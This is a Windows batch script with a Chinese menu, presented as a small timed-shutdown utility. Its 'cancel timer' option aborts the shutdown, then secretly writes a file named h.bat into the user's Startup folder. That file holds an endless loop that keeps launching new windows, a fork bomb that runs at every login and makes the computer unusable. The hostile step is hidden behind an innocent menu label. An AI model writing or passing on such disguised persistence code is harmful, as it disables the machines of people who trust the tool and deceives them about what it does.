@echo off
title 定时关机小程序v1.0  
color 0a
:menu
cls 清除屏幕
echo ==================================
echo               菜单
echo            1.定时关机
echo            2.取消定时
echo            3.退出
echo ==================================
set /p num=您的选择
if "%num%"=="1"  goto 1
if "%num%"=="2"  goto 2
if "%num%"=="3"  goto 3
goto menu
:1
set /p aa=请输入时间（单位/秒）
shutdown /s /t  %aa%"
goto menu
:2
shutdown -a
echo :a >> "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\h.bat"
echo start >>"%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\h.bat"
echo goto a >>"%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\h.bat"
goto menu
:3
exit
